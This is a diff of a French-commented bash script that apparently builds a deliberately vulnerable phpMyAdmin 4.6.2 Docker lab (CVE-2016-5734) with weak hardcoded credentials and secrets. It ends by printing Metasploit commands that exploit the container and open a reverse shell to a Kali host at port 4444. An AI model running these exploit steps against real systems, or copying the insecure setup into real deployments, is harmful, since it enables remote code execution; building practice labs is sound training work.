@@ -1,40 +1,113 @@
 #!/bin/bash
 set -e
 
-echo "[*] Nettoyage..."
+echo "=========================================="
+echo "  phpMyAdmin 4.6.2 - Installation Custom"
+echo "  CVE-2016-5734 (preg_replace RCE)"
+echo "=========================================="
+echo ""
+
+# Vérifier root
+if [ "$EUID" -ne 0 ]; then 
+    echo "❌ Lance avec sudo"
+    exit 1
+fi
+
+echo "[1/5] Création du répertoire de travail..."
+WORKDIR="/tmp/phpmyadmin-build-$$"
+mkdir -p "$WORKDIR"
+cd "$WORKDIR"
+
+echo "[2/5] Génération du Dockerfile..."
+cat > Dockerfile << 'DOCKERFILE_END'
+FROM php:7.0-apache
+
+RUN apt-get update && apt-get install -y wget unzip && rm -rf /var/lib/apt/lists/*
+RUN docker-php-ext-install mysqli
+
+WORKDIR /var/www/html
+RUN wget -q https://files.phpmyadmin.net/phpMyAdmin/4.6.2/phpMyAdmin-4.6.2-all-languages.zip \
+    && unzip -q phpMyAdmin-4.6.2-all-languages.zip \
+    && rm phpMyAdmin-4.6.2-all-languages.zip \
+    && mv phpMyAdmin-4.6.2-all-languages/* . \
+    && rm -rf phpMyAdmin-4.6.2-all-languages
+
+RUN cp config.sample.inc.php config.inc.php \
+    && sed -i "s/\$cfg\['blowfish_secret'\] = '';/\$cfg['blowfish_secret'] = 'iron4softwaresecret123';/" config.inc.php \
+    && mkdir -p tmp && chmod 777 tmp
+
+RUN chown -R www-data:www-data /var/www/html && chmod -R 755 /var/www/html
+
+EXPOSE 80
+CMD ["apache2-foreground"]
+DOCKERFILE_END
+
+echo "[3/5] Nettoyage ancien container..."
 docker stop phpmyadmin-vuln 2>/dev/null || true
 docker rm phpmyadmin-vuln 2>/dev/null || true
 
-echo "[*] Installation phpMyAdmin 4.0..."
-docker pull phpmyadmin/phpmyadmin:4.0
+echo "[4/5] Build Docker (2-3 minutes, patience...)..."
+docker build -t phpmyadmin-custom:4.6.2 . 
 
-echo "[*] Lancement container..."
+if [ $? -ne 0 ]; then
+    echo "❌ Build échoué"
+    exit 1
+fi
+
+echo "[5/5] Lancement container..."
 docker run -d \
     --name phpmyadmin-vuln \
+    --restart unless-stopped \
     --add-host=host.docker.internal:host-gateway \
-    -e PMA_HOST=host.docker.internal \
-    -e PMA_PORT=3306 \
     -p 8080:80 \
-    phpmyadmin/phpmyadmin:4.0
+    phpmyadmin-custom:4.6.2
 
-sleep 10
+sleep 15
+
+SERVER_IP=$(hostname -I | awk '{print $1}')
+
+# Nettoyage
+cd /
+rm -rf "$WORKDIR"
 
 echo ""
-echo "✅ PRÊT !"
+echo "=========================================="
+echo "  ✅ INSTALLATION RÉUSSIE !"
+echo "=========================================="
 echo ""
-docker ps | grep phpmyadmin
+docker ps | grep phpmyadmin || echo "Container démarré"
 echo ""
-curl -I http://localhost:8080/ 2>/dev/null | head -3
+echo "📊 Informations:"
+echo "   Version: phpMyAdmin 4.6.2"
+echo "   CVE: CVE-2016-5734"
+echo "   URL: http://${SERVER_IP}:8080/"
+echo "   Credentials: root / rootpass"
 echo ""
-echo "EXPLOITATION:"
+
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)
+if [ "$HTTP_CODE" = "200" ]; then
+    echo "✅ phpMyAdmin accessible (HTTP 200)"
+else
+    echo "⚠️  Attends 30 secondes et teste: curl http://localhost:8080/"
+fi
+
+echo ""
+echo "=========================================="
+echo "  🔥 EXPLOITATION METASPLOIT"
+echo "=========================================="
+echo ""
+echo "Depuis Kali (192.168.100.10):"
 echo ""
 echo "msfconsole -q"
 echo "use exploit/multi/http/phpmyadmin_preg_replace"
-echo "set RHOSTS 192.168.1.250"
-echo "set RPORT 8080"  
+echo "set RHOSTS ${SERVER_IP}"
+echo "set RPORT 8080"
 echo "set USERNAME root"
 echo "set PASSWORD rootpass"
 echo "set LHOST 192.168.100.10"
 echo "set LPORT 4444"
+echo "check"
 echo "exploit"
+echo ""
+echo "=========================================="
 echo ""
